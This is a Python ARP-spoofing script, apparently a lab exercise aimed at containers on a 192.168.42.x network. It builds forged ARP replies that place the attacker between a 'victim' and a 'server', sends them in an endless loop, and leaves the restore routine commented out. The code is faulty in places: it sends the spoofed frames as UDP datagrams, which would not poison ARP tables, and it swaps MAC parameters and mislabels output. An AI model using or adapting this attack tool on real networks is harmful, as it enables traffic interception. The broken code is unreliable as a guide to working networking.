#!/usr/local/bin/python3

#!/home/luis/.venv/inquisitor/bin/python3

import scapy.all as scapy
import time
import uuid
import socket


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


#print(get_mac("192.168.0.26"))

############################################################################
# Helper functions to construct packets
############################################################################


def mac_to_bytes(mac: str) -> bytes:
    """
    Translates a IP address into a bytes array
    """
    return bytes.fromhex(mac.replace(':', ''))


def ip_to_bytes(ip: str) -> bytes:
    """
    Translates a IP address into a bytes array
    """
    elems = ip.split('.')
    result = b''
    for elem in elems:
        elem_int = int(elem)
        elem_hex = hex(elem_int)[2:]
        if 0 <= elem_int <= 15:
            elem_hex = '0' + elem_hex
        elem_byte = bytes.fromhex(elem_hex)
        result += elem_byte
    return result


def show_packet(pack: bytes):
    block = pack.hex()
    c=1
    sep= ' '
    for n in range(0,len(block),4):
        print(block[n:n+4],' ', end=sep)
        c = c + 1
        if c <= 7:
            sep = ' '
        else:
            c = 0
            sep = '\n'
    print('\n',"-"*46) 


def arp_reply(att_mac: str, sen_ip: str, tar_mac: str, tar_ip: str) -> bytes:
    """
    This simulates a reply to a previous inexistent request comming from the
    the victim(client) or from the server that wants
    to know mac address of either of the server or the (client) victim

    It is a reply send by the attackant on behalf of the one that reveived
    the request.
    """

    hardware_type = b'\x00\x01'
    # The type of MAC address being sought
    # The EtherType value for Xerox PUP is 0x0400 (legacy)
    # The "hardware type" field specifies the type of network interface
    # hardware being used. It is represented by a 16-bit value.
    # Some commonly used values for the hardware type field include:
    # 1: Ethernet (10Mb)
    # 6: IEEE 802 networks (Ethernet)
    # 15: Frame Relay
    # 16: Asynchronous Transfer Mode (ATM)
    # 17: HDLC

    protocol_type = b'\x08\x00'  # The Layer-3 protocol in use
    # The "protocol type" field indicates the network protocol being used
    # in the higher layer of the OSI model. It is a 16-bit value.
    # The most common protocol types encountered in ARP packets are:
    # 0x0800: Internet Protocol version 4 (IPv4)
    # 0x0806: Address Resolution Protocol (ARP)
    # 0x86DD: Internet Protocol version 6 (IPv6)
    # 0x8035: Reverse Address Resolution Protocol (RARP)
    # 0x809B: AppleTalk
    hardware_Size = b'\x06'             # The length of the MAC address
    protocol_size = b'\x04'
    opcode = b'\x00\x02'                # Type of ARP message 2=reply 1=request
    sender_MAC = mac_to_bytes(att_mac)  # Attackant MAC address
    sender_IP = ip_to_bytes(sen_ip)     # who received request packet
    target_MAC = mac_to_bytes(tar_mac)  # who sent request paquet.
    target_IP = ip_to_bytes(tar_ip)

    part_a = hardware_type + protocol_type + hardware_Size + protocol_size
    part_b = opcode + sender_MAC + sender_IP + target_MAC + target_IP
    return part_a + part_b


def ether_pack(src_mac: str, dst_mac: str, payload: bytes, t: bytes) -> bytes:
    """
    Constructs an ether Pack
    """
    dest_mac = mac_to_bytes(src_mac)
    sour_mac = mac_to_bytes(dst_mac)
    return dest_mac + sour_mac + t + payload


############################################################################
# Helper functions to poison and restablish server and victim ARP Tables
############################################################################
def poison_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
                  sou_mac: str, sou_ip: str,   # server MAC & IP
                  des_mac: str, des_ip: str):  # victim MAC & IP

    # Spoofed Arp Reply sent to the victim in response to
    # its request about server mac address
    arp_poi_vic = arp_reply(att_mac=att_mac,           # Attackant MAC
                            sen_ip=sou_ip,             # server IP
                            tar_mac=des_mac,           # victim MAC
                            tar_ip=des_ip)             # victim IP

    # Spoofed Arp Reply sent to the Server in response to
    # its request about victim mac address
    arp_poi_ser = arp_reply(att_mac=att_mac,           # Attackant MAC
                            sen_ip=des_ip,             # victim IP
                            tar_mac=sou_mac,           # server MAC
                            tar_ip=sou_ip)             # server IP

    # ether pack to poison victim arp table
    eth_poi_vic = ether_pack(dst_mac=des_mac,           # victim MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_poi_vic,
                             t=b'\x08\x06')             # ARP TYpe

    # ether pack to poison server arp table
    eth_poi_ser = ether_pack(dst_mac=sou_mac,           # server MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_poi_ser,
                             t=b'\x08\x06')             # ARP TYpe
    

    """
    #with socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM) as rs:
        rs.bind(('eth0',8000))
        sentbytes = rs.send(arp_poi_vic)
        print("Sent packet of length %d bytes" % sentbytes)
        sentbytes = rs.send(eth_poi_ser)
        print("Sent packet of length %d bytes" % sentbytes)
    """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sk:
    #with socket.socket(socket.AF_INET, socket.SOCK_DGRAM,proto=) as sk:
        sk.connect((des_ip, 4000))
        sk.sendall(arp_poi_vic)
        scapy.hexdump(arp_poi_vic)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sk:
        sk.connect((sou_ip, 4000))
        sk.sendall(eth_poi_ser)
        scapy.hexdump(arp_poi_vic)
    

def amend_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
                 sou_mac: str, sou_ip: str,   # server MAC & IP
                 des_mac: str, des_ip: str):  # vistim MAC & IP

    # Regular Arp Reply sent to the victim in response to
    # its request about server mac address
    arp_reg_vic = arp_reply(att_mac=sou_mac,            # server MAC
                            sen_ip=sou_ip,              # server IP
                            tar_mac=des_mac,            # victim MAC
                            tar_ip=des_ip)              # victim IP

    # Regular Arp Reply sent to the Server in response to
    # its request about victim mac address
    arp_reg_ser = arp_reply(att_mac=des_mac,            # victim MAC
                            sen_ip=des_ip,              # victim IP
                            tar_mac=sou_mac,            # server MAC
                            tar_ip=sou_ip)              # server IP

    # ether pack to correct victim arp table
    eth_reg_vic = ether_pack(dst_mac=des_mac,           # victim MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_reg_vic,
                             t=b'\x08\x06')             # ARP TYpe

    # ether pack to correc server arp table
    eth_reg_ser = ether_pack(dst_mac=sou_mac,           # server MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_reg_ser,
                             t=b'\x08\x06')             # ARP TYpe


hostname = socket.gethostname()
att_hex = hex(uuid.getnode())                      # Attackant
att_aux=''
for n in range(2,len(att_hex), 2):
    att_aux = att_aux + att_hex[n: n+2] +':'
att_mac = att_aux[:-1]                    # Attackant
att_ip = socket.gethostbyname(hostname)   # Attackant
att_ip = "192.168.42.4"                   # Attackant
att_mac = "02:42:c0:a8:2a:04"
sou_ip = "192.168.42.2"                   # server
sou_mac = "02:42:c0:a8:2a:02"             # server
des_ip = "192.168.42.3"                   # victim
des_mac = "02:42:c0:a8:2a:03"             # victim

while True:
    poison_tables(att_mac=att_mac, att_ip=att_ip,        # Attackant MAC & IP
              sou_mac=sou_mac, sou_ip=sou_ip,        # server MAC & IP
              des_mac=des_mac, des_ip=des_ip)        # vistim MAC & IP

"""
amend_tables(att_mac=att_mac, att_ip=att_ip,         # Attackant MAC & IP
             sou_mac=sou_mac, sou_ip=sou_ip,         # server MAC & IP
             des_ip=des_ip, des_mac=des_mac)         # vistim MAC & IP

"""

